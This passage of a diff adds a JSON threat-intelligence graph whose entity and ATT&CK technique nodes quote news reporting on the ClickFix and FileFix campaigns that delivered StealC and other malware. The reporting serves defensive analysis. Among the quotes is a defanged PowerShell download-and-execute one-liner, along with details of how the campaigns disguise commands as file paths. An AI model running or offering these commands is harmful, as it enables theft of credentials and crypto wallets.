+              "\"Throughout our investigation, we've uncovered several iterations of the attack, going back two weeks,\" observed Acronis."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_5a41715fe692",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Google",
+        "edges": [
+          "EDGE_d2bd068e4054"
+        ],
+        "source": {
+          "Google_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              16,
+              "The cybersecurity company said it also observed other variants of the activity where victims are guided to run an MSHTA command pointing to a lookalike Google domain (\"wl.google-587262[.]com\"), which then retrieves and executes a remote malicious script."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_6120e967f906",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Facebook",
+        "edges": [
+          "EDGE_338cbeadfff9",
+          "EDGE_7a9031acde09",
+          "EDGE_a9438c5ed178"
+        ],
+        "source": {
+          "Facebook_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              1,
+              "\"The observed campaign uses a highly convincing, multilingual phishing site (e.g., fake Facebook Security page), with anti-analysis techniques and advanced obfuscation to evade detection,\" Acronis security researcher Eliad Kimhy said in a report shared with The Hacker News."
+            ],
+            [
+              6,
+              "The attack commences with a phishing site to which the victim is likely redirected from an email message that warns recipients of potential suspension of their Facebook accounts after a week, claiming the shared posts or messages violate its policies."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_bf47d8fe871b",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "AutoHotkey",
+        "edges": [
+          "EDGE_12f488fd2d08",
+          "EDGE_3623380b8d0a"
+        ],
+        "source": {
+          "AutoHotkey_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              14,
+              "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script."
+            ]
+          ],
+          "AHK_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              17,
+              "\"AHK is a Windows-based scripting language originally designed for automating repetitive tasks like keystrokes and mouse clicks,\" Doppel security researcher Aarsh Jawa noted."
+            ],
+            [
+              18,
+              "\"While it's long been popular among power users and system admins for its simplicity and flexibility, threat actors began weaponizing AHK around 2019 to create lightweight malware droppers and info-stealers."
+            ]
+          ]
+        },
+        "alias": [
+          "AHK"
+        ]
+      },
+      {
+        "node_id": "HL_e6b9ef29f5d3",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "TeamViewer",
+        "edges": [
+          "EDGE_abffd6f613be"
+        ],
+        "source": {
+          "TeamViewer_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              15,
+              "The script is designed to profile the compromised host and deliver additional payloads, including AnyDesk, TeamViewer, information stealers, and clipper malware."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_f576dbcf13da",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Doppel",
+        "edges": [],
+        "source": {
+          "Doppel_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              14,
+              "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script."
+            ],
+            [
+              17,
+              "\"AHK is a Windows-based scripting language originally designed for automating repetitive tasks like keystrokes and mouse clicks,\" Doppel security researcher Aarsh Jawa noted."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_f8b77c8fe4ea",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "AnyDesk",
+        "edges": [
+          "EDGE_7006ab291dbf"
+        ],
+        "source": {
+          "AnyDesk_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              15,
+              "The script is designed to profile the compromised host and deliver additional payloads, including AnyDesk, TeamViewer, information stealers, and clipper malware."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_04d31b20ce49",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "Interlock",
+        "edges": [],
+        "source": {
+          "Interlock_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": [
+            [
+              3,
+              "This is not the first time FileFix has been used in attacks, with the Interlock ransomware gang previously using FileFix to install its remote access trojan (RAT)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_153928bf9609",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "PowerShell",
+        "edges": [
+          "EDGE_1bcf824222e5",
+          "EDGE_291a5e159f4a",
+          "EDGE_40422d3334f9",
+          "EDGE_63cbac443576",
+          "EDGE_85f03ccca4ab"
+        ],
+        "source": {
+          "PowerShell_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": [
+            [
+              2,
+              "The FileFix technique was created by red team researcher mr.d0x, and instead of convincing users into pasting malicious PowerShell commands into the Windows Run dialog or terminal, FileFix abuses the address bar in File Explorer to execute the commands."
+            ],
+            [
+              6,
+              "However, this report is not actually a document, but a disguised PowerShell command used to install malware on targets' devices."
+            ],
+            [
+              8,
+              "However, clicking the Copy button actually copies a PowerShell command with added spaces into the Windows clipboard, so that only the file path is shown when pasted into File Explorer."
+            ],
+            [
+              11,
+              "In an average ClickFix attack, this is done using the # symbol instead of a variable, which is taken by PowerShell as a developer comment.\"\n\"This has the unintentional advantage that anyone who has built their detections to look for the \"#\" symbol from ClickFix, is likely to miss this.\"\nThis FileFix campaign stands out as it uses steganography to hide both a second-stage PowerShell script and encrypted executables inside what appears to be a harmless JPG image hosted on Bitbucket."
+            ],
+            [
+              12,
+              "The first-stage PowerShell command, unknowingly entered by the target, first downloads the image, extracts the embedded secondary script, which is then used to decrypt the payloads in memory."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_229e990e839d",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "File Explorer",
+        "edges": [
+          "EDGE_ad6f6c5ab2ea",
+          "EDGE_cc453af7e1de"
+        ],
+        "source": {
+          "File Explorer_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": [
+            [
+              2,
+              "The FileFix technique was created by red team researcher mr.d0x, and instead of convincing users into pasting malicious PowerShell commands into the Windows Run dialog or terminal, FileFix abuses the address bar in File Explorer to execute the commands."
+            ],
+            [
+              7,
+              "The phishing page tells users to click the \"Copy\" button to copy what appears to be a file path, click on the open File Explorer button, and then paste the path into the File Explorer address bar to open the document."
+            ],
+            [
+              8,
+              "However, clicking the Copy button actually copies a PowerShell command with added spaces into the Windows clipboard, so that only the file path is shown when pasted into File Explorer."
+            ]
+          ],
+          "Windows File Explorer_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              2,
+              "Moreover, a new variation called FileFix has emerged – a stealthier evolution that uses Windows File Explorer, showing how quickly threat actors are adapting ClickFix-style deception into even subtler forms."
+            ],
+            [
+              21,
+              "First revealed by security researcher mr.d0x in June 2025, FileFix shifts the attack surface from the Windows Run dialog to the Windows File Explorer address bar."
+            ]
+          ]
+        },
+        "alias": [
+          "Windows File Explorer"
+        ]
+      },
+      {
+        "node_id": "HL_51c9daeb24d8",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Meta",
+        "edges": [
+          "EDGE_493e1f6edd00",
+          "EDGE_8b39c4d60f27"
+        ],
+        "source": {
+          "Meta_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": [
+            [
+              0,
+              "A newly discovered FileFix social engineering attack impersonates Meta account suspension warnings to trick users into unknowingly installing the StealC infostealer malware."
+            ],
+            [
+              5,
+              "The new campaign, discovered by Acronis, uses a multi-language phishing page that poses as Meta's support team, warning recipients that their account will be disabled in seven days unless they view an \"incident report\" allegedly shared by Meta."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_b3e5c62fd3dd",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "ClickFix",
+        "edges": [
+          "EDGE_585d8d9e5785__3767599d",
+          "EDGE_a3f3d77ee82a__6705c7f0",
+          "EDGE_1b020f1dbc05",
+          "EDGE_725ee8f9b421",
+          "EDGE_2eb090cf20dc"
+        ],
+        "source": {
+          "ClickFix_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              4,
+              "FileFix, first documented by security researcher mrd0x as a proof-of-concept (PoC) in June 2025, is a little different from ClickFix in that it eschews the need for users to launch the Windows Run dialog and paste an already copied obfuscated command to complete bogus CAPTCHA verification checks on phishing pages set up for this purpose."
+            ],
+            [
+              12,
+              "FileFix also offers a crucial advantage over ClickFix, as it abuses a widely used browser feature as opposed to opening the Run dialog (or the Terminal app in case of Apple macOS), which could be blocked by a system administrator as a security measure."
+            ],
+            [
+              14,
+              "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script."
+            ]
+          ],
+          "ClickFix_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": [
+            [
+              1,
+              "FileFix is a new variant of the ClickFix family of attacks, which uses social engineering attacks to trick users into pasting malicious commands into operating system dialog boxes as supposed \"fixes\" for problems."
+            ],
+            [
+              11,
+              "In an average ClickFix attack, this is done using the # symbol instead of a variable, which is taken by PowerShell as a developer comment.\"\n\"This has the unintentional advantage that anyone who has built their detections to look for the \"#\" symbol from ClickFix, is likely to miss this.\"\nThis FileFix campaign stands out as it uses steganography to hide both a second-stage PowerShell script and encrypted executables inside what appears to be a harmless JPG image hosted on Bitbucket."
+            ],
+            [
+              15,
+              "\"Through these iterations, we can trace out an evolution of both the social engineering technique, and the more technical aspects of the attack.\"\n\"Perhaps this is indicative or an attacker testing out an infrastructure they are planning to use in the future, or perhaps these are iterations added to the attack mid campaign, as the attacker learns to adapt and improve.\"\nWhile most organizations have educated their employees on phishing tactics, ClickFix and FileFix tactics remain relatively new and continue to evolve."
+            ]
+          ]
+        }
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1014",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1014",
+        "ttp_id": "T1014",
+        "best_span_sentences_list": [
+          [
+            "- Observed final payloads include infostealers (Lumma, Aura), loaders (Latrodectus, MintsLoader), RATs (NetSupport, WebSocket RATs), and rootkits (r77 variants)."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            19,
+            19
+          ]
+        ],
+        "edges": [
+          "EDGE_1dd54a53add6"
+        ],
+        "source": {
+          "TTP:T1014_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                19,
+                19
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "- Observed final payloads include infostealers (Lumma, Aura), loaders (Latrodectus, MintsLoader), RATs (NetSupport, WebSocket RATs), and rootkits (r77 variants)."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1027",
+        "ttp_id": "T1027",
+        "best_span_sentences_list": [
+          [
+            "- The malicious command is often obfuscated (Base64, string concatenation, escaped characters) to hide intent and avoid casual inspection."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            17,
+            17
+          ]
+        ],
+        "edges": [
+          "EDGE_25387f639307",
+          "EDGE_c28a71e563ff",
+          "EDGE_338cbeadfff9",
+          "EDGE_7a558495399a",
+          "EDGE_226c4d6f4883",
+          "EDGE_291a5e159f4a",
+          "EDGE_2eb090cf20dc"
+        ],
+        "source": {
+          "TTP:T1027_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                17,
+                17
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "- The malicious command is often obfuscated (Base64, string concatenation, escaped characters) to hide intent and avoid casual inspection."
+              ]
+            ]
+          },
+          "TTP:T1027_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": {
+            "best_span_ranges": [
+              [
+                1,
+                1
+              ],
+              [
+                7,
+                11
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "\"The observed campaign uses a highly convincing, multilingual phishing site (e.g., fake Facebook Security page), with anti-analysis techniques and advanced obfuscation to evade detection,\" Acronis security researcher Eliad Kimhy said in a report shared with The Hacker News."
+              ],
+              [
+                "Users are then asked to appeal the decision by clicking on a button.",
+                "The phishing page is not only heavily obfuscated, but also resorts to techniques like junk code and fragmentation to hinder analysis efforts.",
+                "The FileFix attack comes into play once the button is clicked, at which point the victim is displayed a message stating they can access a PDF version of the supposed policy violation by copying and pasting a path to the document in the File Explorer's address bar.",
+                "While the path provided in the instruction appears completely harmless, clicking the \"Copy\" button actually copies a malicious command that's suffixed with extra spaces, so that only the file path is displayed when pasted into File Explorer upon opening it using the \"Open File Explorer\" button.",
+                "This command is a multi-stage PowerShell script that downloads the aforementioned image, decodes it into the next-stage payload, and ultimately runs a Go-based loader that unpacks shellcode responsible for launching StealC."
+              ]
+            ]
+          },
+          "TTP:T1027_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": {
+            "best_span_ranges": [
+              [
+                11,
+                12
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In an average ClickFix attack, this is done using the # symbol instead of a variable, which is taken by PowerShell as a developer comment.\"\n\"This has the unintentional advantage that anyone who has built their detections to look for the \"#\" symbol from ClickFix, is likely to miss this.\"\nThis FileFix campaign stands out as it uses steganography to hide both a second-stage PowerShell script and encrypted executables inside what appears to be a harmless JPG image hosted on Bitbucket.",
+                "The first-stage PowerShell command, unknowingly entered by the target, first downloads the image, extracts the embedded secondary script, which is then used to decrypt the payloads in memory."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1036",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1036",
+        "ttp_id": "T1036",
+        "best_span_sentences_list": [
+          [
+            "According to Microsoft’s analysis, attackers distribute a malicious Chrome extension masquerading as a legitimate ad blocker.",
+            "The campaign abuses native Windows tools, including finger.exe (renamed to evade detection), to retrieve obfuscated PowerShell payloads."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            45,
+            46
+          ]
+        ],
+        "edges": [
+          "EDGE_042c6a1c2f2b",
+          "EDGE_57a79c091289",
+          "EDGE_8cf03ee92f40",
+          "EDGE_0988a923a256",
+          "EDGE_7a9031acde09",
+          "EDGE_d2bd068e4054"
+        ],
+        "source": {
+          "TTP:T1036_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                45,
+                46
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "According to Microsoft’s analysis, attackers distribute a malicious Chrome extension masquerading as a legitimate ad blocker.",
+                "The campaign abuses native Windows tools, including finger.exe (renamed to evade detection), to retrieve obfuscated PowerShell payloads."
+              ]
+            ]
+          },
+          "TTP:T1036_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": {
+            "best_span_ranges": [
+              [
+                19,
+                19
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "These malicious scripts often masquerade as benign automation tools or support utilities.\""
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1053",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1053",
+        "ttp_id": "T1053",
+        "best_span_sentences_list": [
+          [
+            "On domain-joined systems, the infection chain escalates by deploying a portable WinPython environment and a Python-based RAT (referred to as ModeloRAT), which establishes persistence via registry Run keys and scheduled tasks, and communicates with C2 infrastructure over HTTP."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            47,
+            47
+          ]
+        ],
+        "edges": [
+          "EDGE_5d1cbdc3203c",
+          "EDGE_d83af50301a1"
+        ],
+        "source": {
+          "TTP:T1053_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                47,
+                47
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "On domain-joined systems, the infection chain escalates by deploying a portable WinPython environment and a Python-based RAT (referred to as ModeloRAT), which establishes persistence via registry Run keys and scheduled tasks, and communicates with C2 infrastructure over HTTP."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1059",
+        "ttp_id": "T1059",
+        "best_span_sentences_list": [
+          [
+            "When users follow the “fix” instructions and paste it into their Run, Terminal, or PowerShell window, they unknowingly execute the attacker’s code."
+          ],
+          [
+            "Attackers use JavaScript APIs to copy malicious commands to the user’s clipboard."
+          ],
+          [
+            "- The landing page displays step-by-step instructions (for example, open Run with Win+R, paste, and press Enter) and often includes convincing UI elements like faux CAPTCHAs or brand logos to reduce suspicion."
+          ],
+          [
+            "The initial command frequently downloads a small downloader or script that in turn retrieves a larger payload from attacker-controlled infrastructure."
+          ],
+          [
+            "Copying and pasting the provided token launched PowerShell commands that installed a WebSocket RAT capable of live remote access."
+          ],
+          [
+            "The videos instructed users to run commands such as: iex (irm slmgr[.]win/photoshop)\nWhen executed, the command downloaded the Aura Stealer, which harvested browser credentials and crypto wallets."
+          ],
+          [
+            "When users followed instructions to paste copied text into the Run command, the injected PowerShell script installed the Interlock RAT."
+          ],
+          [
+            "The fake alert instructed victims to paste a path into File Explorer – in reality, a disguised PowerShell command.",
+            "The payload chain dropped AI-generated images embedded with hidden PowerShell scripts that installed StealC v2, a powerful stealer malware capable of stealing credentials, crypto wallets, and VPN data."
+          ],
+          [
+            "The campaign abuses native Windows tools, including finger.exe (renamed to evade detection), to retrieve obfuscated PowerShell payloads.",
+            "On domain-joined systems, the infection chain escalates by deploying a portable WinPython environment and a Python-based RAT (referred to as ModeloRAT), which establishes persistence via registry Run keys and scheduled tasks, and communicates with C2 infrastructure over HTTP."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            6
+          ],
+          [
+            14,
+            14
+          ],
+          [
+            16,
+            16
+          ],
+          [
+            18,
+            18
+          ],
+          [
+            27,
+            27
+          ],
+          [
+            30,
+            30
+          ],
+          [
+            33,
+            33
+          ],
+          [
+            36,
+            37
+          ],
+          [
+            46,
+            47
+          ]
+        ],
+        "edges": [
+          "EDGE_04930fc18d9e",
+          "EDGE_11aaaa1d3f34",
+          "EDGE_3926783d4916",
+          "EDGE_3d4dc7d99b13",
+          "EDGE_415dacec3bad",
+          "EDGE_450848c5a7e3",
+          "EDGE_4c6429021270",
+          "EDGE_66ae7a784c7b",
+          "EDGE_8e24cfdfe53d",
+          "EDGE_db31874291c7",
+          "EDGE_12f488fd2d08",
+          "EDGE_45313f61ddb3",
+          "EDGE_fca7cd8a6086",
+          "EDGE_098611420873",
+          "EDGE_1bcf824222e5",
+          "EDGE_ad6f6c5ab2ea",
+          "EDGE_a3f3d77ee82a__6705c7f0"
+        ],
+        "source": {
+          "TTP:T1059_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                6,
+                6
+              ],
+              [
+                14,
+                14
+              ],
+              [
+                16,
+                16
+              ],
+              [
+                18,
+                18
+              ],
+              [
+                27,
+                27
+              ],
+              [
+                30,
+                30
+              ],
+              [
+                33,
+                33
+              ],
+              [
+                36,
+                37
+              ],
+              [
+                46,
+                47
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "When users follow the “fix” instructions and paste it into their Run, Terminal, or PowerShell window, they unknowingly execute the attacker’s code."
+              ],
+              [
+                "Attackers use JavaScript APIs to copy malicious commands to the user’s clipboard."
+              ],
+              [
+                "- The landing page displays step-by-step instructions (for example, open Run with Win+R, paste, and press Enter) and often includes convincing UI elements like faux CAPTCHAs or brand logos to reduce suspicion."
+              ],
+              [
+                "The initial command frequently downloads a small downloader or script that in turn retrieves a larger payload from attacker-controlled infrastructure."
+              ],
+              [
+                "Copying and pasting the provided token launched PowerShell commands that installed a WebSocket RAT capable of live remote access."
+              ],
+              [
+                "The videos instructed users to run commands such as: iex (irm slmgr[.]win/photoshop)\nWhen executed, the command downloaded the Aura Stealer, which harvested browser credentials and crypto wallets."
+              ],
+              [
+                "When users followed instructions to paste copied text into the Run command, the injected PowerShell script installed the Interlock RAT."
+              ],
+              [
+                "The fake alert instructed victims to paste a path into File Explorer – in reality, a disguised PowerShell command.",
+                "The payload chain dropped AI-generated images embedded with hidden PowerShell scripts that installed StealC v2, a powerful stealer malware capable of stealing credentials, crypto wallets, and VPN data."
+              ],
+              [
+                "The campaign abuses native Windows tools, including finger.exe (renamed to evade detection), to retrieve obfuscated PowerShell payloads.",
+                "On domain-joined systems, the infection chain escalates by deploying a portable WinPython environment and a Python-based RAT (referred to as ModeloRAT), which establishes persistence via registry Run keys and scheduled tasks, and communicates with C2 infrastructure over HTTP."
+              ]
+            ]
+          },
+          "TTP:T1059_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": {
+            "best_span_ranges": [
+              [
+                5,
+                5
+              ],
+              [
+                7,
+                11
+              ],
+              [
+                13,
+                16
+              ],
+              [
+                18,
+                18
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Instead, it leverages a web browser's file upload feature to deceive users into copying and pasting a command on the File Explorer's address bar, causing it to be executed locally on the victim's machine."
+              ],
+              [
+                "Users are then asked to appeal the decision by clicking on a button.",
+                "The phishing page is not only heavily obfuscated, but also resorts to techniques like junk code and fragmentation to hinder analysis efforts.",
+                "The FileFix attack comes into play once the button is clicked, at which point the victim is displayed a message stating they can access a PDF version of the supposed policy violation by copying and pasting a path to the document in the File Explorer's address bar.",
+                "While the path provided in the instruction appears completely harmless, clicking the \"Copy\" button actually copies a malicious command that's suffixed with extra spaces, so that only the file path is displayed when pasted into File Explorer upon opening it using the \"Open File Explorer\" button.",
+                "This command is a multi-stage PowerShell script that downloads the aforementioned image, decodes it into the next-stage payload, and ultimately runs a Go-based loader that unpacks shellcode responsible for launching StealC."
+              ],
+              [
+                "\"On the other hand, one of the things that makes ClickFix so challenging to detect in the first place is that it is spawned from Explorer.exe via the run dialog, or directly from a terminal, whereas with FileFix, the payload is executed by the web browser used by the victim, which is far more likely to stand out in an investigation or to a security product,\" Acronis said.",
+                "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script.",
+                "The script is designed to profile the compromised host and deliver additional payloads, including AnyDesk, TeamViewer, information stealers, and clipper malware.",
+                "The cybersecurity company said it also observed other variants of the activity where victims are guided to run an MSHTA command pointing to a lookalike Google domain (\"wl.google-587262[.]com\"), which then retrieves and executes a remote malicious script."
+              ],
+              [
+                "\"While it's long been popular among power users and system admins for its simplicity and flexibility, threat actors began weaponizing AHK around 2019 to create lightweight malware droppers and info-stealers."
+              ]
+            ]
+          },
+          "TTP:T1059_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": {
+            "best_span_ranges": [
+              [
+                1,
+                2
+              ],
+              [
+                5,
+                12
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "FileFix is a new variant of the ClickFix family of attacks, which uses social engineering attacks to trick users into pasting malicious commands into operating system dialog boxes as supposed \"fixes\" for problems.",
+                "The FileFix technique was created by red team researcher mr.d0x, and instead of convincing users into pasting malicious PowerShell commands into the Windows Run dialog or terminal, FileFix abuses the address bar in File Explorer to execute the commands."
+              ],
+              [
+                "The new campaign, discovered by Acronis, uses a multi-language phishing page that poses as Meta's support team, warning recipients that their account will be disabled in seven days unless they view an \"incident report\" allegedly shared by Meta.",
+                "However, this report is not actually a document, but a disguised PowerShell command used to install malware on targets' devices.",
+                "The phishing page tells users to click the \"Copy\" button to copy what appears to be a file path, click on the open File Explorer button, and then paste the path into the File Explorer address bar to open the document.",
+                "However, clicking the Copy button actually copies a PowerShell command with added spaces into the Windows clipboard, so that only the file path is shown when pasted into File Explorer.",
+                "\"In order to trick the user into thinking that they are pasting the path to an 'incident report' PDF file, the attacker has placed a variable at the end of the payload, which contains a lot of spaces and the fake path at the end,\" explains Acronis.",
+                "\"This is done so that only the file path would appear in the address bar, and none of the actual malicious commands.",
+                "In an average ClickFix attack, this is done using the # symbol instead of a variable, which is taken by PowerShell as a developer comment.\"\n\"This has the unintentional advantage that anyone who has built their detections to look for the \"#\" symbol from ClickFix, is likely to miss this.\"\nThis FileFix campaign stands out as it uses steganography to hide both a second-stage PowerShell script and encrypted executables inside what appears to be a harmless JPG image hosted on Bitbucket.",
+                "The first-stage PowerShell command, unknowingly entered by the target, first downloads the image, extracts the embedded secondary script, which is then used to decrypt the payloads in memory."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1071",
+        "ttp_id": "T1071",
+        "best_span_sentences_list": [
+          [
+            "On domain-joined systems, the infection chain escalates by deploying a portable WinPython environment and a Python-based RAT (referred to as ModeloRAT), which establishes persistence via registry Run keys and scheduled tasks, and communicates with C2 infrastructure over HTTP."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            47,
+            47
+          ]
+        ],
+        "edges": [
+          "EDGE_1a204ed603fe",
+          "EDGE_1f116259609e",
+          "EDGE_3191a370f999",
+          "EDGE_b1dd59f20743"
+        ],
+        "source": {
+          "TTP:T1071_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                47,
+                47
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "On domain-joined systems, the infection chain escalates by deploying a portable WinPython environment and a Python-based RAT (referred to as ModeloRAT), which establishes persistence via registry Run keys and scheduled tasks, and communicates with C2 infrastructure over HTTP."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1105",
+        "ttp_id": "T1105",
+        "best_span_sentences_list": [
+          [
+            "The initial command frequently downloads a small downloader or script that in turn retrieves a larger payload from attacker-controlled infrastructure."
+          ],
+          [
+            "The videos instructed users to run commands such as: iex (irm slmgr[.]win/photoshop)\nWhen executed, the command downloaded the Aura Stealer, which harvested browser credentials and crypto wallets."
+          ],
+          [
+            "The campaign abuses native Windows tools, including finger.exe (renamed to evade detection), to retrieve obfuscated PowerShell payloads."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            18,
+            18
+          ],
+          [
+            30,
+            30
+          ],
+          [
+            46,
+            46
+          ]
+        ],
+        "edges": [
+          "EDGE_071e020f9234",
+          "EDGE_2e25f714f4b2",
+          "EDGE_9aebf9efad1a",
+          "EDGE_a3e38363735e",
+          "EDGE_c2ed7cc2ae20",
+          "EDGE_cf1fecc44522",
+          "EDGE_3623380b8d0a",
+          "EDGE_7006ab291dbf",
+          "EDGE_abffd6f613be",
+          "EDGE_cebc593e3936",
+          "EDGE_e25463db7097",
+          "EDGE_f213d30736e4",
+          "EDGE_f26944381037",
+          "EDGE_40422d3334f9",
+          "EDGE_1b020f1dbc05"
+        ],
+        "source": {
+          "TTP:T1105_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                18,
+                18
+              ],
+              [
+                30,
+                30
+              ],
+              [
+                46,
+                46
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The initial command frequently downloads a small downloader or script that in turn retrieves a larger payload from attacker-controlled infrastructure."
+              ],
+              [
+                "The videos instructed users to run commands such as: iex (irm slmgr[.]win/photoshop)\nWhen executed, the command downloaded the Aura Stealer, which harvested browser credentials and crypto wallets."
+              ],
+              [
+                "The campaign abuses native Windows tools, including finger.exe (renamed to evade detection), to retrieve obfuscated PowerShell payloads."
+              ]
+            ]
+          },
+          "TTP:T1105_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": {
+            "best_span_ranges": [
+              [
+                2,
+                2
+              ],
+              [
+                11,
+                11
+              ],
+              [
+                13,
+                16
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "At a high level, the attack chain involves the use of FileFix to entice users into launching an initial payload that then proceeds to download seemingly innocuous images containing the malicious components from a Bitbucket repository."
+              ],
+              [
+                "This command is a multi-stage PowerShell script that downloads the aforementioned image, decodes it into the next-stage payload, and ultimately runs a Go-based loader that unpacks shellcode responsible for launching StealC."
+              ],
+              [
